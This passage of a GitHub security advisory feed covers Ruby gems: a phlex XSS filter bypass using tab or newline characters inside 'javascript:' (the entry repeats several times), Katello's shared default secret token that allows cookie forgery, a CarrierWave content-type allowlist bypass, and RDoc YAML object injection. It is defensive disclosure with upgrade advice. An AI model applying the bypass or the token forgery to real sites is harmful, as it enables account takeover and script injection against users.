<li><a href="https://github.com/advisories/GHSA-g7xq-xv8c-h98c">https://github.com/advisories/GHSA-g7xq-xv8c-h98c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g7xq-xv8c-h98c</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-04-17T00:20:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phlex] Cross-site Scripting (XSS) possible due to improper sanitisation of `href` attributes on `<a>` tags]]></title>
        <id>https://github.com/advisories/GHSA-g7xq-xv8c-h98c</id>
        <link href="https://github.com/advisories/GHSA-g7xq-xv8c-h98c"/>
        <updated>2024-04-19T21:44:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>There is a potential cross-site scripting (XSS) vulnerability that can be exploited via maliciously crafted user data.</p>
<p>Our filter to detect and prevent the use of the <code>javascript:</code> URL scheme in the <code>href</code> attribute of an <code>&lt;a&gt;</code> tag could be bypassed with tab <code>\t</code> or newline <code>\n</code> characters between the characters of the protocol, e.g. <code>java\tscript:</code>.</p>
<h3 id="impact">Impact</h3>
<p>If you render an <code>&lt;a&gt;</code> tag with an <code>href</code> attribute set to a user-provided link, that link could potentially execute JavaScript when clicked by another user.</p>
<pre><code class="language-ruby">a(href: user_profile) { "Profile" }
</code></pre>
<h3 id="mitigation">Mitigation</h3>
<p>The best way to mitigate this vulnerability is to update to one of the following versions:</p>
<ul>
<li><a href="https://rubygems.org/gems/phlex/versions/1.10.1">1.10.1</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.9.2">1.9.2</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.8.3">1.8.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.7.2">1.7.2</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.6.3">1.6.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.5.3">1.5.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.4.2">1.4.2</a></li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Configuring a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">Content Security Policy</a> that does not allow <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline"><code>unsafe-inline</code></a> would effectively prevent this vulnerability from being exploited.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c">https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c</a></li>
<li><a href="https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb">https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32463">https://nvd.nist.gov/vuln/detail/CVE-2024-32463</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-g7xq-xv8c-h98c">https://github.com/advisories/GHSA-g7xq-xv8c-h98c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g7xq-xv8c-h98c</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-04-17T00:20:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phlex] Cross-site Scripting (XSS) possible due to improper sanitisation of `href` attributes on `<a>` tags]]></title>
        <id>https://github.com/advisories/GHSA-g7xq-xv8c-h98c</id>
        <link href="https://github.com/advisories/GHSA-g7xq-xv8c-h98c"/>
        <updated>2024-04-19T21:44:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>There is a potential cross-site scripting (XSS) vulnerability that can be exploited via maliciously crafted user data.</p>
<p>Our filter to detect and prevent the use of the <code>javascript:</code> URL scheme in the <code>href</code> attribute of an <code>&lt;a&gt;</code> tag could be bypassed with tab <code>\t</code> or newline <code>\n</code> characters between the characters of the protocol, e.g. <code>java\tscript:</code>.</p>
<h3 id="impact">Impact</h3>
<p>If you render an <code>&lt;a&gt;</code> tag with an <code>href</code> attribute set to a user-provided link, that link could potentially execute JavaScript when clicked by another user.</p>
<pre><code class="language-ruby">a(href: user_profile) { "Profile" }
</code></pre>
<h3 id="mitigation">Mitigation</h3>
<p>The best way to mitigate this vulnerability is to update to one of the following versions:</p>
<ul>
<li><a href="https://rubygems.org/gems/phlex/versions/1.10.1">1.10.1</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.9.2">1.9.2</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.8.3">1.8.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.7.2">1.7.2</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.6.3">1.6.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.5.3">1.5.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.4.2">1.4.2</a></li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Configuring a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">Content Security Policy</a> that does not allow <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline"><code>unsafe-inline</code></a> would effectively prevent this vulnerability from being exploited.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c">https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c</a></li>
<li><a href="https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb">https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32463">https://nvd.nist.gov/vuln/detail/CVE-2024-32463</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-g7xq-xv8c-h98c">https://github.com/advisories/GHSA-g7xq-xv8c-h98c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g7xq-xv8c-h98c</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-04-17T00:20:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phlex] Cross-site Scripting (XSS) possible due to improper sanitisation of `href` attributes on `<a>` tags]]></title>
        <id>https://github.com/advisories/GHSA-g7xq-xv8c-h98c</id>
        <link href="https://github.com/advisories/GHSA-g7xq-xv8c-h98c"/>
        <updated>2024-04-19T21:44:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>There is a potential cross-site scripting (XSS) vulnerability that can be exploited via maliciously crafted user data.</p>
<p>Our filter to detect and prevent the use of the <code>javascript:</code> URL scheme in the <code>href</code> attribute of an <code>&lt;a&gt;</code> tag could be bypassed with tab <code>\t</code> or newline <code>\n</code> characters between the characters of the protocol, e.g. <code>java\tscript:</code>.</p>
<h3 id="impact">Impact</h3>
<p>If you render an <code>&lt;a&gt;</code> tag with an <code>href</code> attribute set to a user-provided link, that link could potentially execute JavaScript when clicked by another user.</p>
<pre><code class="language-ruby">a(href: user_profile) { "Profile" }
</code></pre>
<h3 id="mitigation">Mitigation</h3>
<p>The best way to mitigate this vulnerability is to update to one of the following versions:</p>
<ul>
<li><a href="https://rubygems.org/gems/phlex/versions/1.10.1">1.10.1</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.9.2">1.9.2</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.8.3">1.8.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.7.2">1.7.2</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.6.3">1.6.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.5.3">1.5.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.4.2">1.4.2</a></li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Configuring a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">Content Security Policy</a> that does not allow <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline"><code>unsafe-inline</code></a> would effectively prevent this vulnerability from being exploited.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c">https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c</a></li>
<li><a href="https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb">https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32463">https://nvd.nist.gov/vuln/detail/CVE-2024-32463</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-g7xq-xv8c-h98c">https://github.com/advisories/GHSA-g7xq-xv8c-h98c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g7xq-xv8c-h98c</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-04-17T00:20:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phlex] Cross-site Scripting (XSS) possible due to improper sanitisation of `href` attributes on `<a>` tags]]></title>
        <id>https://github.com/advisories/GHSA-g7xq-xv8c-h98c</id>
        <link href="https://github.com/advisories/GHSA-g7xq-xv8c-h98c"/>
        <updated>2024-04-19T21:44:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>There is a potential cross-site scripting (XSS) vulnerability that can be exploited via maliciously crafted user data.</p>
<p>Our filter to detect and prevent the use of the <code>javascript:</code> URL scheme in the <code>href</code> attribute of an <code>&lt;a&gt;</code> tag could be bypassed with tab <code>\t</code> or newline <code>\n</code> characters between the characters of the protocol, e.g. <code>java\tscript:</code>.</p>
<h3 id="impact">Impact</h3>
<p>If you render an <code>&lt;a&gt;</code> tag with an <code>href</code> attribute set to a user-provided link, that link could potentially execute JavaScript when clicked by another user.</p>
<pre><code class="language-ruby">a(href: user_profile) { "Profile" }
</code></pre>
<h3 id="mitigation">Mitigation</h3>
<p>The best way to mitigate this vulnerability is to update to one of the following versions:</p>
<ul>
<li><a href="https://rubygems.org/gems/phlex/versions/1.10.1">1.10.1</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.9.2">1.9.2</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.8.3">1.8.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.7.2">1.7.2</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.6.3">1.6.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.5.3">1.5.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.4.2">1.4.2</a></li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Configuring a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">Content Security Policy</a> that does not allow <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline"><code>unsafe-inline</code></a> would effectively prevent this vulnerability from being exploited.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c">https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c</a></li>
<li><a href="https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb">https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32463">https://nvd.nist.gov/vuln/detail/CVE-2024-32463</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-g7xq-xv8c-h98c">https://github.com/advisories/GHSA-g7xq-xv8c-h98c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g7xq-xv8c-h98c</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-04-17T00:20:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[katello] Katello uses hard coded credential]]></title>
        <id>https://github.com/advisories/GHSA-5xv2-q475-rwrh</id>
        <link href="https://github.com/advisories/GHSA-5xv2-q475-rwrh"/>
        <updated>2024-04-12T18:08:37.000Z</updated>
        <content type="html"><![CDATA[<p>The installation script in Katello 1.0 and earlier does not properly generate the <code>Application.config.secret_token</code> value, which causes each default installation to have the same secret token, and allows remote attackers to authenticate to the CloudForms System Engine web interface as an arbitrary user by creating a cookie using the default <code>secret_token</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2012-3503">https://nvd.nist.gov/vuln/detail/CVE-2012-3503</a></li>
<li><a href="https://github.com/Katello/katello/pull/499">https://github.com/Katello/katello/pull/499</a></li>
<li><a href="https://github.com/Katello/katello/commit/7c256fef9d75029d0ffff58ff1dcda915056d3a3">https://github.com/Katello/katello/commit/7c256fef9d75029d0ffff58ff1dcda915056d3a3</a></li>
<li><a href="http://rhn.redhat.com/errata/RHSA-2012-1186.html">http://rhn.redhat.com/errata/RHSA-2012-1186.html</a></li>
<li><a href="http://rhn.redhat.com/errata/RHSA-2012-1187.html">http://rhn.redhat.com/errata/RHSA-2012-1187.html</a></li>
<li><a href="https://web.archive.org/web/20140806122239/http://secunia.com/advisories/50344">https://web.archive.org/web/20140806122239/http://secunia.com/advisories/50344</a></li>
<li><a href="https://web.archive.org/web/20200229120740/http://www.securityfocus.com/bid/55140">https://web.archive.org/web/20200229120740/http://www.securityfocus.com/bid/55140</a></li>
<li><a href="https://github.com/advisories/GHSA-5xv2-q475-rwrh">https://github.com/advisories/GHSA-5xv2-q475-rwrh</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/katello/CVE-2012-3503.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/katello/CVE-2012-3503.yml</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5xv2-q475-rwrh</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-05-17T05:13:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[katello] Katello uses hard coded credential]]></title>
        <id>https://github.com/advisories/GHSA-5xv2-q475-rwrh</id>
        <link href="https://github.com/advisories/GHSA-5xv2-q475-rwrh"/>
        <updated>2024-04-12T18:08:37.000Z</updated>
        <content type="html"><![CDATA[<p>The installation script in Katello 1.0 and earlier does not properly generate the <code>Application.config.secret_token</code> value, which causes each default installation to have the same secret token, and allows remote attackers to authenticate to the CloudForms System Engine web interface as an arbitrary user by creating a cookie using the default <code>secret_token</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2012-3503">https://nvd.nist.gov/vuln/detail/CVE-2012-3503</a></li>
<li><a href="https://github.com/Katello/katello/pull/499">https://github.com/Katello/katello/pull/499</a></li>
<li><a href="https://github.com/Katello/katello/commit/7c256fef9d75029d0ffff58ff1dcda915056d3a3">https://github.com/Katello/katello/commit/7c256fef9d75029d0ffff58ff1dcda915056d3a3</a></li>
<li><a href="http://rhn.redhat.com/errata/RHSA-2012-1186.html">http://rhn.redhat.com/errata/RHSA-2012-1186.html</a></li>
<li><a href="http://rhn.redhat.com/errata/RHSA-2012-1187.html">http://rhn.redhat.com/errata/RHSA-2012-1187.html</a></li>
<li><a href="https://web.archive.org/web/20140806122239/http://secunia.com/advisories/50344">https://web.archive.org/web/20140806122239/http://secunia.com/advisories/50344</a></li>
<li><a href="https://web.archive.org/web/20200229120740/http://www.securityfocus.com/bid/55140">https://web.archive.org/web/20200229120740/http://www.securityfocus.com/bid/55140</a></li>
<li><a href="https://github.com/advisories/GHSA-5xv2-q475-rwrh">https://github.com/advisories/GHSA-5xv2-q475-rwrh</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/katello/CVE-2012-3503.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/katello/CVE-2012-3503.yml</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5xv2-q475-rwrh</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-05-17T05:13:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[carrierwave] CarrierWave content-Type allowlist bypass vulnerability which possibly leads to XSS remained]]></title>
        <id>https://github.com/advisories/GHSA-vfmv-jfc5-pjjw</id>
        <link href="https://github.com/advisories/GHSA-vfmv-jfc5-pjjw"/>
        <updated>2024-03-27T13:00:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The vulnerability <a href="https://github.com/carrierwaveuploader/carrierwave/security/advisories/GHSA-gxhx-g4fq-49hj">CVE-2023-49090</a> wasn't fully addressed.</p>
<p>This vulnerability is caused by the fact that when uploading to object storage, including Amazon S3, it is possible to set a Content-Type value that is interpreted by browsers to be different from what's allowed by <code>content_type_allowlist</code>, by providing multiple values separated by commas.</p>
<p>This bypassed value can be used to cause XSS.</p>
<h3 id="patches">Patches</h3>
<p>Upgrade to <a href="https://rubygems.org/gems/carrierwave/versions/3.0.7">3.0.7</a> or <a href="https://rubygems.org/gems/carrierwave/versions/2.2.6">2.2.6</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Use the following monkey patch to let CarrierWave parse the Content-type by using <code>Marcel::MimeType.for</code>.</p>
<pre><code class="language-ruby"># For CarrierWave 3.x
CarrierWave::SanitizedFile.class_eval do
  def declared_content_type
    @declared_content_type ||
      if @file.respond_to?(:content_type) &amp;&amp; @file.content_type
        Marcel::MimeType.for(declared_type: @file.content_type.to_s.chomp)
      end
  end
end
</code></pre>
<pre><code class="language-ruby"># For CarrierWave 2.x
CarrierWave::SanitizedFile.class_eval do
  def existing_content_type
    if @file.respond_to?(:content_type) &amp;&amp; @file.content_type
      Marcel::MimeType.for(declared_type: @file.content_type.to_s.chomp)
    end
  end
end
</code></pre>
<h3 id="references">References</h3>
<p><a href="https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html#content-type-validation">OWASP - File Upload Cheat Sheet</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/carrierwaveuploader/carrierwave/security/advisories/GHSA-vfmv-jfc5-pjjw">https://github.com/carrierwaveuploader/carrierwave/security/advisories/GHSA-vfmv-jfc5-pjjw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-29034">https://nvd.nist.gov/vuln/detail/CVE-2024-29034</a></li>
<li><a href="https://github.com/carrierwaveuploader/carrierwave/commit/25b1c800d45ef8e78dc445ebe3bd8a6e3f0a3477">https://github.com/carrierwaveuploader/carrierwave/commit/25b1c800d45ef8e78dc445ebe3bd8a6e3f0a3477</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/carrierwave/CVE-2024-29034.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/carrierwave/CVE-2024-29034.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-vfmv-jfc5-pjjw">https://github.com/advisories/GHSA-vfmv-jfc5-pjjw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vfmv-jfc5-pjjw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-25T19:40:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[carrierwave] CarrierWave content-Type allowlist bypass vulnerability which possibly leads to XSS remained]]></title>
        <id>https://github.com/advisories/GHSA-vfmv-jfc5-pjjw</id>
        <link href="https://github.com/advisories/GHSA-vfmv-jfc5-pjjw"/>
        <updated>2024-03-27T13:00:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The vulnerability <a href="https://github.com/carrierwaveuploader/carrierwave/security/advisories/GHSA-gxhx-g4fq-49hj">CVE-2023-49090</a> wasn't fully addressed.</p>
<p>This vulnerability is caused by the fact that when uploading to object storage, including Amazon S3, it is possible to set a Content-Type value that is interpreted by browsers to be different from what's allowed by <code>content_type_allowlist</code>, by providing multiple values separated by commas.</p>
<p>This bypassed value can be used to cause XSS.</p>
<h3 id="patches">Patches</h3>
<p>Upgrade to <a href="https://rubygems.org/gems/carrierwave/versions/3.0.7">3.0.7</a> or <a href="https://rubygems.org/gems/carrierwave/versions/2.2.6">2.2.6</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Use the following monkey patch to let CarrierWave parse the Content-type by using <code>Marcel::MimeType.for</code>.</p>
<pre><code class="language-ruby"># For CarrierWave 3.x
CarrierWave::SanitizedFile.class_eval do
  def declared_content_type
    @declared_content_type ||
      if @file.respond_to?(:content_type) &amp;&amp; @file.content_type
        Marcel::MimeType.for(declared_type: @file.content_type.to_s.chomp)
      end
  end
end
</code></pre>
<pre><code class="language-ruby"># For CarrierWave 2.x
CarrierWave::SanitizedFile.class_eval do
  def existing_content_type
    if @file.respond_to?(:content_type) &amp;&amp; @file.content_type
      Marcel::MimeType.for(declared_type: @file.content_type.to_s.chomp)
    end
  end
end
</code></pre>
<h3 id="references">References</h3>
<p><a href="https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html#content-type-validation">OWASP - File Upload Cheat Sheet</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/carrierwaveuploader/carrierwave/security/advisories/GHSA-vfmv-jfc5-pjjw">https://github.com/carrierwaveuploader/carrierwave/security/advisories/GHSA-vfmv-jfc5-pjjw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-29034">https://nvd.nist.gov/vuln/detail/CVE-2024-29034</a></li>
<li><a href="https://github.com/carrierwaveuploader/carrierwave/commit/25b1c800d45ef8e78dc445ebe3bd8a6e3f0a3477">https://github.com/carrierwaveuploader/carrierwave/commit/25b1c800d45ef8e78dc445ebe3bd8a6e3f0a3477</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/carrierwave/CVE-2024-29034.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/carrierwave/CVE-2024-29034.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-vfmv-jfc5-pjjw">https://github.com/advisories/GHSA-vfmv-jfc5-pjjw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vfmv-jfc5-pjjw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-25T19:40:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rdoc] RDoc RCE vulnerability with .rdoc_options]]></title>
        <id>https://github.com/advisories/GHSA-592j-995h-p23j</id>
        <link href="https://github.com/advisories/GHSA-592j-995h-p23j"/>
        <updated>2024-05-14T18:13:52.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in RDoc 6.3.3 through 6.6.2, as distributed in Ruby 3.x through 3.3.0.</p>
<p>When parsing <code>.rdoc_options</code> (used for configuration in RDoc) as a YAML file, object injection and resultant remote code execution are possible because there are no restrictions on the classes that can be restored.</p>
<p>When loading the documentation cache, object injection and resultant remote code execution are also possible if there were a crafted cache.</p>
<p>We recommend to update the RDoc gem to version 6.6.3.1 or later. In order to ensure compatibility with bundled version in older Ruby series, you may update as follows instead:</p>
<ul>
<li>For Ruby 3.0 users: Update to <code>rdoc</code> 6.3.4.1</li>
<li>For Ruby 3.1 users: Update to <code>rdoc</code> 6.4.1.1</li>
<li>For Ruby 3.2 users: Update to <code>rdoc</code> 6.5.1.1</li>
</ul>
<p>You can use <code>gem update rdoc</code> to update it. If you are using bundler, please add <code>gem "rdoc", "&gt;= 6.6.3.1"</code> to your <code>Gemfile</code>.</p>
<p>Note: 6.3.4, 6.4.1, 6.5.1 and 6.6.3 have a incorrect fix. We recommend to upgrade 6.3.4.1, 6.4.1.1, 6.5.1.1 and 6.6.3.1 instead of them.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ruby/rdoc/commit/1254b0066f312ddbf7fae7a195e66ce5b3bc6656">https://github.com/ruby/rdoc/commit/1254b0066f312ddbf7fae7a195e66ce5b3bc6656</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/32ff6ba0bebd8ea26f569da5fd23be2937f6a644">https://github.com/ruby/rdoc/commit/32ff6ba0bebd8ea26f569da5fd23be2937f6a644</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/48617985e9fbc2825219d55f04e3e0e98d2923be">https://github.com/ruby/rdoc/commit/48617985e9fbc2825219d55f04e3e0e98d2923be</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/811f125a4a0cc968e3eb18e16ea6c1a3b49a11bf">https://github.com/ruby/rdoc/commit/811f125a4a0cc968e3eb18e16ea6c1a3b49a11bf</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/a5de13bf0f0c26f8e764e82b5bf4bf8bffc7198e">https://github.com/ruby/rdoc/commit/a5de13bf0f0c26f8e764e82b5bf4bf8bffc7198e</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/d22ba930f1f611dda531dba04cd3d2531bb3f8a5">https://github.com/ruby/rdoc/commit/d22ba930f1f611dda531dba04cd3d2531bb3f8a5</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/da7a0c7553ef7250ca665a3fecdc01dbaacbb43d">https://github.com/ruby/rdoc/commit/da7a0c7553ef7250ca665a3fecdc01dbaacbb43d</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/e4a0e71e6f1032f8b4e5e58b4ef60d702c22ce17">https://github.com/ruby/rdoc/commit/e4a0e71e6f1032f8b4e5e58b4ef60d702c22ce17</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rdoc/CVE-2024-27281.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rdoc/CVE-2024-27281.yml</a></li>
<li><a href="https://www.ruby-lang.org/en/news/2024/03/21/rce-rdoc-cve-2024-27281">https://www.ruby-lang.org/en/news/2024/03/21/rce-rdoc-cve-2024-27281</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27281">https://nvd.nist.gov/vuln/detail/CVE-2024-27281</a></li>
<li><a href="https://github.com/advisories/GHSA-592j-995h-p23j">https://github.com/advisories/GHSA-592j-995h-p23j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-592j-995h-p23j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-25T19:36:59.000Z</published>
    </entry>
    <entry>
